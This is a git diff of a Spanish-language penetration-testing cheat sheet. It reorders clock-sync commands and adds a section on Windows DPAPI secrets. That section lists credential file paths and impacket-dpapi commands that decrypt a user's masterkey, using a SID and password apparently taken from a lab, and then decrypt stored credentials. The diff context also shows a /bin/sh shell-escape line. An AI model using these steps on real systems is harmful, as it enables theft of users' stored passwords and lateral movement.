@@ -271,18 +271,18 @@ os.execute('/bin/sh')
 ####  1.1.3. <a name='configuración-de-fecha-y-hora'></a>Configuración de Fecha y Hora
 
 ```bash
+sudo timedatectl set-timezone UTC
+sudo timedatectl set-time '2015-11-20 18:00:00'
+sudo timedatectl set-time 18:00:00
+sudo timedatectl list-timezones
+sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
+sudo timedatectl set-local-rtc 1
 sudo net time -c <RHOST>
 sudo net time set -S <RHOST>
 sudo net time \\<RHOST> /set /y
 sudo ntpdate <RHOST>
-sudo ntpdate -s <RHOST>
 sudo ntpdate -b -u <RHOST>
-sudo timedatectl set-timezone UTC
-sudo timedatectl list-timezones
-sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
-sudo timedatectl set-time 15:58:30
-sudo timedatectl set-time '2015-11-20 16:14:50'
-sudo timedatectl set-local-rtc 1
+sudo ntpdate -s <RHOST>
 ```
 
 ###  1.2. <a name='windows'></a>Windows
@@ -3153,6 +3153,49 @@ Algunos otros archivos en los que podemos encontrar credenciales incluyen lo sig
 C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*
 ```
+
+##### DPAPI Secrets
+
+La API de protección de datos (DPAPI) es un componente interno del sistema Windows. Permite que diversas aplicaciones almacenen datos confidenciales (p. ej., contraseñas). Los datos se almacenan en el directorio de usuarios y están protegidos por claves maestras específicas del usuario, derivadas de su contraseña. Suelen estar ubicados en:
+
+```powershell
+C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
+```
+
+Aplicaciones como Google Chrome, Outlook, entre otros, utilizan la API DPAPI. Windows también utiliza esta API para información confidencial, como contraseñas de Wi-Fi, certificados, contraseñas de conexión RDP y mucho más.
+
+A continuación se muestran rutas comunes de archivos ocultos que generalmente contienen datos protegidos por DPAPI.
+
+```powershell
+C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+```
+
+![alt=DPAPI](/img/dpapi-01.png)
+![alt=DPAPI](/img/dpapi-02.png)
+
+Usamos Impacket para **desencriptar la masterkey**, lo cual es un paso clave. Sin esta clave, no podriamos desencriptar los secretos protegidos por DPAPI.
+
+```bash
+impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
+```
+
+![alt=DPAPI](/img/dpapi-03.png)
+
+- Lee el archivo **MasterKey**.
+- Usa el **SID** y la **contraseña del usuario** para derivar la User Key.
+- Desencripta la MasterKey con esa User Key.
+
+Desencriptamos las credenciales.
+
+```bash
+impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+```
+
+![alt=DPAPI](/img/dpapi-04.png)
+
+> Windows usa la contraseña del usuario para derivar una clave (SHA1(MD4(password))) y con eso desencripta las MasterKey. Y luego esa MasterKey desencripta los secretos reales.
+
 ##### Credenciales guardadas
 
 El [comando CMDKey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede usar para crear, enumerar y eliminar los nombres de usuario y contraseñas almacenados. Los usuarios pueden desear almacenar credenciales para un host específico o usarlo para almacenar credenciales para conexiones de servicios de terminal para conectarse a un host remoto que usa escritorio remoto sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o aumentar los privilegios en el host actual para aprovechar las credenciales almacenadas para otro usuario.
